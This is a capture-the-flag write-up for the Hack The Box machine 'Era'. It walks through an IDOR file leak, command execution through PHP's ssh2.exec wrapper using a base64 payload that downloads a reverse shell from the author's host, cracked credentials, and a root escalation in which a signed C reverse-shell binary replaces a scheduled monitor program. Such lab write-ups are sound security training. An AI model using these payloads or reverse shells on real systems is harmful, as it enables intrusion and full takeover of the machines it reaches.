```json
Alias: Era
Date: 27-07_2025
Platform: Hackthebox
OS: Linux
Difficulty: Medium
Status: Complete
IP: 10.129.136.212
```

# Era
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-27 17:16 +0500
Nmap scan report for 10.129.136.212
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.53 seconds
```
## Discovered Subdomains
```
era.htb
file.era.htb
```

---
# Enumeration

Only port 80 and 21 are available on this box. First, doing some subdomain enumeration we find `file.era.htb`. Then, with directory fuzzing we figure out that there is a file named `http://file.era.htb/register.php` . 

Creating an account then logging in, we quickly see that we can upload and view files. The first thing to do is upload a file and discover that we can download them by `download.php?id=1`. So, you can guess we'd try for IDOR next by fuzzing all the numbers. With this we find `id=54` giving us a backup of the site and `id=150` which contains a private key.

Going through the site's code we find this interesting part in `download.php`

```php
	// BETA (Currently only available to the admin) - Showcase file instead of downloading it
	} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    		$format = isset($_GET['format']) ? $_GET['format'] : '';
    		$file = $fetched[0];

		if (strpos($format, '://') !== false) {
        		$wrapper = $format;
        		header('Content-Type: application/octet-stream');
    		} else {
        		$wrapper = '';
        		header('Content-Type: text/html');
    		}

    		try {
        		$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
			$full_path = $wrapper ? $wrapper . $file : $file;
			// Debug Output
			echo "Opening: " . $full_path . "\n";
        		echo $file_content;
    		} catch (Exception $e) {
        		echo "Error reading file: " . $e->getMessage();
    		}

```


---
# Exploitation

after trying a few things, it turns out that the php `ssh2://` filter is enabled. So we can get command execution like this

```
file.era.htb/download.php?id=4151&show=true&dl=false&format=ssh2.exec://yuri:mustang@127.0.0.1:22/echo Y3VybCBodHRwOi8vMTAuMTAuMTYuNTkvZmlsZXMvc2hlbGwxLnBocCA%2BIHJldnNoZWxsLnBocA%3D%3D% | base64 -d | bash;/
```

```
file.era.htb/download.php?id=4151&show=true&dl=false&format=ssh2.exec://yuri:mustang@127.0.0.1:22/echo Y3VybCBodHRwOi8vMTAuMTAuMTYuNTkvP2E9JChwaHAgcmV2c2hlbGwucGhwKQ%3D%3D | base64 -d | bash;/
```

You'll have to change the base64 encoded parts, as the first command downloads a PHP reverse shell from my IP and the second command executes it. With this we get a shell as `yuri`

After trying to crack the passwords in the `sqlite3` database file in the site backup, I found the following credentials

| Username | Password |
| -------- | -------- |
| yuri     | mustang  |
| eric     | america  |


---

# Lateral Movement

Login as eric:

```bash
su eric
```

and get the user flag.

---

# Privilege Escalation

Next, go to `/opt/AV/periodic-checks`, there is a binary file named monitor and a `status.log`. With `pspy64` I found out that the monitor binary is being run periodically.

Since we can replace the binary, I just switched it with a compiled reverse shell

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4445;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.16.59");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    return 0;       
}
```

but we get an error with this. `pspy64` shows that when this command is run

```bash
objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
```

The script fails. It's trying to extract a section named `.text_sig` from the binary and compare it to the `.text` section of the binary after signing the `.text` section. Luckily, we found that key earlier and can recreate this.

First create a cert from the key and the `x509.generate` config file we found

```bash
openssl req -new -x509 -key key.pem -config x509.genkey -extensions myexts -days 365 -sha256 -out signer_cert.pem
```

Next, extract the `.text` section from our reverse shell

```bash
objcopy --dump-section .text=text_section.bin monitor
```

Sign it with the cert we generated

```bash
openssl cms -sign \
  -binary \
  -in text_section.bin \
  -signer signing/signer_cert.pem \
  -inkey signing/key.pem \
  -outform DER \
  -nosmimecap \
  -noattr \
  -nocerts \
  -md sha256 \
  -out text_sig_section.bin
```

add the signed `.text` to a new section named `.text_sig`

```bash
objcopy --add-section .text_sig=text_sig_section.bin monitor monitorSigned
```

Replace this newly signed binary with `/opt/VA/periodic-checks/monitor` and start up a listener

---

# Flags
- user.txt
- root.txt

#CTF